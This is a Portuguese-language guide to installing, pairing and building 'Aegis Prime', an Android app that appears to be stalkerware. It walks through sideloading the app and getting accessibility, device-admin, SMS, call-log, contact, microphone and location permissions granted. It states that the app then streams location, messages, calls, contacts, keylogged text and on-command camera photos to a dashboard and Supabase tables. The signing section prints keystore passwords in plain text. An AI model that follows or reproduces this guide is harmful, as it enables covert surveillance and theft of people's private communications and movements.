# 🛡️ AEGIS PRIME - INSTRUÇÕES DE INSTALAÇÃO E USO

## 📱 INSTALAÇÃO DO APK

### Localização do APK
```
C:\Users\felli\Desktop\aegis\android-nativo\outputs\apk\release\aegis-prime-FINAL.apk
```

**Tamanho:** 15 MB
**MD5:** 6c47d76dd4f12aa4d85987792db33441
**Versão:** 1.0

### Passos para Instalação

1. **Transferir APK para o celular:**
   - Via USB: Copie o arquivo para a pasta Download do celular
   - Via Dashboard: Baixe de `http://192.168.15.4:3001/aegis-prime.apk`

2. **Permitir instalação de fontes desconhecidas:**
   - Vá em Configurações → Segurança
   - Ative "Instalar apps desconhecidos" para o navegador/gerenciador de arquivos

3. **Instalar o APK:**
   - Abra o arquivo `aegis-prime-FINAL.apk`
   - Clique em "Instalar"
   - Aguarde a conclusão

---

## 🔐 FLUXO DE PERMISSÕES

O app solicita permissões nesta ordem. **IMPORTANTE:** Você deve conceder TODAS para avançar para o pareamento.

### 1️⃣ ACESSIBILIDADE (Tela Atual)

**O que fazer:**
1. Clique em "Abrir Configurações de Acessibilidade"
2. Procure por "Aegis Prime" na lista
3. Clique em "Aegis Prime"
4. **ATIVE** o interruptor
5. Confirme na janela de aviso
6. Volte ao app (pressione o botão Voltar)

**Se "Aegis Prime" não aparecer:**
- Vá em Configurações → Apps → Aegis Prime → Permissões do app
- Verifique se todas as permissões estão concedidas
- Reinicie o app

### 2️⃣ LOCALIZAÇÃO

**Permissões necessárias:**
- ✅ Localização Precisa (GPS)
- ✅ Localização Aproximada (Rede)

**Ação:** Clique em "Permitir" quando solicitado

### 3️⃣ DADOS (SMS, Chamadas, Contatos)

**Permissões necessárias:**
- ✅ Ler SMS
- ✅ Ler registro de chamadas
- ✅ Ler contatos

**Ação:** Clique em "Permitir" para cada uma

### 4️⃣ CONTROLE REMOTO

**Permissões necessárias:**
- ✅ Gravar áudio (Microfone)
- ✅ Exibir sobre outros apps

**Ação:** Ative ambas as permissões

### 5️⃣ ADMINISTRADOR DO DISPOSITIVO

**O que fazer:**
1. Será redirecionado para ativar Device Admin
2. Clique em "Ativar"
3. Confirme

---

## 🔗 PAREAMENTO COM O DASHBOARD

Após conceder TODAS as permissões, você verá a tela de pareamento:

```
┌──────────────────────────────────┐
│       AEGIS PRIME                │
│                                  │
│  URL DO DASHBOARD                │
│  ┌────────────────────────────┐  │
│  │ http://192.168.15.4:3001   │  │
│  └────────────────────────────┘  │
│                                  │
│  CÓDIGO DE PAREAMENTO            │
│  ┌────────────────────────────┐  │
│  │ 612286                     │  │
│  └────────────────────────────┘  │
│                                  │
│         [ CONNECT ]              │
└──────────────────────────────────┘
```

### Como Parear

**Opção 1: Pareamento Manual**
1. Certifique-se que a URL está correta: `http://192.168.15.4:3001`
2. No dashboard, gere um código de pareamento de 6 dígitos
3. Digite o código no app
4. Clique em "CONNECT"

**Opção 2: QR Code (se disponível)**
1. No dashboard, gere um QR Code
2. Use o botão de scan no app (se implementado)
3. Escaneie o QR Code

### Após o Pareamento Bem-Sucedido

✅ O dispositivo aparecerá no dashboard
✅ Todos os serviços iniciarão automaticamente
✅ Dados começarão a ser enviados:
- Localização em tempo real
- SMS recebidos e enviados
- Registro de chamadas
- Contatos
- Texto digitado (keylogger)
- Fotos da câmera (quando comandado)

---

## 🐛 DEBUG COM LOGCAT

Para diagnosticar problemas, conecte o celular via USB e execute:

```bash
adb logcat -s AegisPrime:D *:S
```

### Logs Importantes

**Ao abrir o app:**
```
=== Verificando Serviço de Acessibilidade ===
Package: com.example.aegis_prime
Expected ID: com.example.aegis_prime/com.example.aegis_prime.services.AegisAccessibilityService
Serviços habilitados: 1
Serviço encontrado: com.example.aegis_prime/com.example.aegis_prime.services.AegisAccessibilityService
✅ SERVIÇO DE ACESSIBILIDADE ATIVO!
```

**Se o serviço NÃO estiver ativo:**
```
❌ Serviço de acessibilidade NÃO está ativo
=== PermissionOrchestrator (trigger=0) ===
Mostrando tela: ACESSIBILIDADE
```

**Quando voltar das configurações (se ativou corretamente):**
```
=== PermissionOrchestrator (trigger=1) ===
✅ SERVIÇO DE ACESSIBILIDADE ATIVO!
Mostrando tela: LOCALIZAÇÃO
```

**Quando TODAS as permissões forem concedidas:**
```
✅ TODAS AS PERMISSÕES CONCEDIDAS! Avançando para PAREAMENTO
```

---

## 🔧 TROUBLESHOOTING

### Problema: App trava na tela de Acessibilidade

**Solução 1: Verificar se o serviço está ativo**
1. Vá em Configurações → Acessibilidade
2. Procure por "Aegis Prime"
3. Verifique se está ATIVADO (interruptor azul/verde)
4. Se não estiver, ative

**Solução 2: Verificar ID do serviço via logcat**
1. Conecte o celular via USB
2. Execute: `adb logcat -s AegisPrime:D *:S`
3. Veja a linha "Expected ID:" e "Serviço encontrado:"
4. Compare se são iguais (ignorando maiúsculas/minúsculas)

**Solução 3: Reinstalar o app**
1. Desinstale completamente o Aegis Prime
2. Limpe os dados (opcional)
3. Reinstale o novo APK
4. Conceda todas as permissões desde o início

### Problema: Serviço aparece mas não reconhece

**Possível causa:** O ID do serviço está diferente do esperado

**Solução:**
1. Execute logcat
2. Copie as linhas "Expected ID:" e "Serviço encontrado:"
3. Envie para análise

### Problema: Não consigo parear com o dashboard

**Verificações:**
1. ✅ Dashboard está rodando em `http://192.168.15.4:3001`?
2. ✅ Celular e PC estão na mesma rede Wi-Fi?
3. ✅ Código de pareamento está correto (6 dígitos)?
4. ✅ Firewall do PC não está bloqueando a porta 3001?

**Teste de conectividade:**
No celular, abra o navegador e acesse: `http://192.168.15.4:3001`
- Se abrir o dashboard → Rede OK
- Se não abrir → Problema de rede/firewall

---

## 📊 BACKEND (SUPABASE)

### Configuração Atual

**URL do Supabase:** `https://hacxikpmgeataaoppsnf.supabase.co`

### Tabelas Esperadas

O app envia dados para estas tabelas:

| Tabela | Descrição | Campos Principais |
|--------|-----------|-------------------|
| `devices` | Informações do dispositivo | device_id, model, android_version |
| `locations` | GPS em tempo real | latitude, longitude, timestamp |
| `sms` | Mensagens SMS | sender, message, timestamp |
| `calls` | Registro de chamadas | number, duration, type |
| `contacts` | Agenda de contatos | name, phone |
| `keylogs` | Texto digitado | app_name, text, timestamp |
| `photos` | Fotos capturadas | image_url, timestamp |
| `commands` | Comandos remotos | command_type, status |

---

## 🚀 COMPILAR NOVO APK

Se você fizer alterações no código e precisar recompilar:

### Método 1: Script Automático (Windows)
```bash
C:\Users\felli\Desktop\aegis\build-and-deploy.bat
```

### Método 2: Script Bash
```bash
cd /c/Users/felli/Desktop/aegis
./build.sh
```

### Método 3: Manual
```bash
cd C:\Users\felli\StudioProjects\aegis_prime
./gradlew assembleRelease

# Copiar APK
cp app/build/outputs/apk/release/app-release.apk C:/Users/felli/Desktop/aegis/android-nativo/outputs/apk/release/

# Assinar
cd C:/Users/felli/Desktop/aegis/android-nativo/outputs/apk/release
jarsigner -verbose -sigalg SHA256withRSA -digestalg SHA-256 \
  -keystore C:/Users/felli/aegis-keystore.jks \
  -storepass aegisprime2026 -keypass aegisprime2026 \
  app-release.apk aegis-key

# Zipalign
C:/Users/felli/AppData/Local/Android/Sdk/build-tools/30.0.3/zipalign.exe \
  -f 4 app-release.apk aegis-prime-FINAL.apk
```

---

## 📝 NOTAS IMPORTANTES

1. **Keystore:** O arquivo `C:\Users\felli\aegis-keystore.jks` é CRÍTICO. Guarde-o em local seguro. Sem ele, você não consegue atualizar o app.

2. **Senha do Keystore:**
   - Store password: `aegisprime2026`
   - Key password: `aegisprime2026`
   - Alias: `aegis-key`

3. **Versão do APK:** Sempre que fizer alterações, incremente a `versionCode` e `versionName` no `build.gradle.kts`

4. **Logs:** Os logs detalhados foram adicionados na versão atual para facilitar o debug. Em produção, você pode removê-los.

---

## ✅ CHECKLIST DE INSTALAÇÃO

- [ ] APK transferido para o celular
- [ ] Instalação concluída
- [ ] App aberto pela primeira vez
- [ ] Serviço de Acessibilidade ATIVADO
- [ ] Permissão de Localização concedida
- [ ] Permissão de SMS/Chamadas/Contatos concedida
- [ ] Permissão de Áudio concedida
- [ ] Permissão de Exibir sobre apps concedida
- [ ] Device Admin ativado
- [ ] Tela de pareamento apareceu
- [ ] Dashboard está rodando
- [ ] Código de pareamento inserido
- [ ] Pareamento bem-sucedido
- [ ] Dispositivo aparece no dashboard

---

**Última atualização:** 02/02/2026 23:30
**Versão do documento:** 1.0
